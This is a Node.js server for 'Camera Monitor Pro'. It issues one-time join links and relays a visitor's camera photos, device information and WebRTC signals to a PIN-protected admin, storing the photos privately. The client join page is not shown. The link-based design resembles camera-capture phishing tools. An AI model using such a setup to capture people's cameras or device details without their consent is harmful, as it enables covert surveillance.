const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const crypto = require("crypto");
const path = require("path");
const fs = require("fs");

const app = express();
const server = http.createServer(app);
const io = new Server(server, { maxHttpBufferSize: 2e6 });
const PORT = process.env.PORT || 3000;
const ADMIN_PIN = process.env.ADMIN_PIN;
const DATA_DIR = path.join(__dirname, "private_uploads");

if (!ADMIN_PIN || ADMIN_PIN.length < 10) {
  console.error("Set ADMIN_PIN to a secret of at least 10 characters.");
  process.exit(1);
}
fs.mkdirSync(DATA_DIR, { recursive: true });

app.use(express.static(path.join(__dirname, "public")));
app.get("/", (_req,res)=>res.redirect("/admin"));
app.get("/admin", (_req,res)=>res.sendFile(path.join(__dirname,"public","admin.html")));
app.get("/join/:id", (_req,res)=>res.sendFile(path.join(__dirname,"public","join.html")));

const rooms = new Map(); // id -> {admin, visitor, created, images:[]}

io.use((socket,next)=>{
  const a=socket.handshake.auth||{};
  if(a.role==="admin" && a.pin===ADMIN_PIN){socket.data.role="admin";return next();}
  if(a.role==="visitor" && typeof a.roomId==="string" && /^[a-f0-9-]{36}$/i.test(a.roomId)){
    socket.data.role="visitor";socket.data.roomId=a.roomId;return next();
  }
  next(new Error("Unauthorized"));
});

io.on("connection",socket=>{
  if(socket.data.role==="admin"){
    socket.on("create-room",cb=>{
      const id=crypto.randomUUID();
      rooms.set(id,{admin:socket.id,visitor:null,created:Date.now(),images:[]});
      socket.join(id); cb?.({id,url:"/join/"+id});
    });
    socket.on("signal",({id,data}={})=>{
      const r=rooms.get(id);if(r&&r.admin===socket.id&&r.visitor)io.to(r.visitor).emit("signal",data);
    });
    socket.on("end-room",({id}={})=>{
      const r=rooms.get(id);if(r&&r.admin===socket.id){io.to(id).emit("room-ended");rooms.delete(id);}
    });
    socket.on("get-gallery",({id}={})=>{
      const r=rooms.get(id);if(r&&r.admin===socket.id)socket.emit("gallery",r.images);
    });
  }else{
    const id=socket.data.roomId,r=rooms.get(id);
    if(!r||r.visitor){socket.emit("join-error","এই সেশনটি আর সক্রিয় নেই বা পূর্ণ।");socket.disconnect(true);return;}
    r.visitor=socket.id;socket.join(id);io.to(r.admin).emit("visitor-joined",{id});
    socket.on("signal",data=>{const x=rooms.get(id);if(x&&x.visitor===socket.id)io.to(x.admin).emit("signal",{id,data});});
    socket.on("device-info",info=>{const x=rooms.get(id);if(x&&x.visitor===socket.id)io.to(x.admin).emit("device-info",{id,info});});
    socket.on("photo",payload=>{
      const x=rooms.get(id);
      if(!x||x.visitor!==socket.id||typeof payload!=="string"||!payload.startsWith("data:image/jpeg;base64,"))return;
      if(payload.length>1_500_000)return;
      const b64=payload.split(",")[1];
      const filename=Date.now()+"-"+crypto.randomBytes(4).toString("hex")+".jpg";
      const file=path.join(DATA_DIR,filename);
      fs.writeFile(file,Buffer.from(b64,"base64"),err=>{
        if(err)return;
        const item={filename,time:new Date().toISOString()};
        x.images.push(item);
        io.to(x.admin).emit("new-photo",{...item,data:payload,count:x.images.length});
      });
    });
    socket.on("stop-sharing",()=>{const x=rooms.get(id);if(x){x.visitor=null;io.to(x.admin).emit("visitor-stopped");}socket.disconnect(true);});
  }
  socket.on("disconnect",()=>{
    for(const [id,r] of rooms.entries()){
      if(r.admin===socket.id){io.to(id).emit("room-ended");rooms.delete(id);}
      else if(r.visitor===socket.id){r.visitor=null;io.to(r.admin).emit("visitor-stopped");}
    }
  });
});

// Private image download; admin PIN is required as a query token.
app.get("/private-photo/:id/:filename",(req,res)=>{
  if(req.query.pin!==ADMIN_PIN)return res.sendStatus(403);
  const r=rooms.get(req.params.id);
  if(!r||r.admin==null||!/^[-\w]+\.jpg$/.test(req.params.filename))return res.sendStatus(404);
  const file=path.join(DATA_DIR,req.params.filename);
  if(!fs.existsSync(file))return res.sendStatus(404);
  res.setHeader("Cache-Control","no-store");
  res.sendFile(file);
});

setInterval(()=>{
  const cutoff=Date.now()-60*60*1000;
  for(const [id,r] of rooms.entries())if(r.created<cutoff){io.to(id).emit("room-ended");rooms.delete(id);}
},60000);

server.listen(PORT,()=>console.log("Camera Monitor Pro running on "+PORT));
